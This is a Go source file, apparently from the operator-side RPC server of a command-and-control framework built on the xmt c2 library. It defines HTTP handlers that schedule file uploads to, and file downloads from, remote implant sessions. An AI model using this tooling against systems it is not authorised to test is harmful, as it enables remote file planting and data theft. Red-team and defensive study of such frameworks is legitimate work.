package rpc

import (
	"context"
	"encoding/base64"
	"net/http"

	"github.com/PurpleSec/routex"
	"github.com/PurpleSec/routex/val"
	"github.com/iDigitalFlame/xmt/c2/task"
)

var (
	valUpload = val.Set{
		val.Validator{Name: "path", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "data", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valDownload = val.Set{val.Validator{Name: "path", Type: val.String, Rules: val.Rules{val.NoEmpty}}}
)

func (r *Server) httpUploadPut(_ context.Context, w http.ResponseWriter, x *routex.Request, c routex.Content) {
	s, _, d, e, err := r.lookup("data", x, c)
	if err != nil {
		if e {
			errors(http.StatusNotFound, http.StatusText(http.StatusNotFound), w, x)
		} else {
			errors(http.StatusBadRequest, err.Error(), w, x)
		}
		return
	}
	p, err := c.String("path")
	if err != nil {
		errors(http.StatusBadRequest, err.Error(), w, x)
		return
	}
	if len(p) == 0 {
		errors(http.StatusBadRequest, "empty upload path", w, x)
		return
	}
	b, err := base64.StdEncoding.DecodeString(d)
	if err != nil {
		errors(http.StatusBadRequest, err.Error(), w, x)
		return
	}
	j, err := s.Schedule(task.File.Upload(p, b))
	if err != nil {
		errors(http.StatusInternalServerError, err.Error(), w, x)
		return
	}
	j.Update = r.complete
	b, _ = j.MarshalJSON()
	w.WriteHeader(http.StatusCreated)
	w.Write(b)
}
func (r *Server) httpDownloadPut(_ context.Context, w http.ResponseWriter, x *routex.Request, c routex.Content) {
	s, _, p, e, err := r.lookup("path", x, c)
	if err != nil {
		if e {
			errors(http.StatusNotFound, http.StatusText(http.StatusNotFound), w, x)
		} else {
			errors(http.StatusBadRequest, err.Error(), w, x)
		}
		return
	}
	j, err := s.Schedule(task.File.Download(p))
	if err != nil {
		errors(http.StatusInternalServerError, err.Error(), w, x)
		return
	}
	j.Update = r.complete
	b, _ := j.MarshalJSON()
	w.WriteHeader(http.StatusCreated)
	w.Write(b)
}
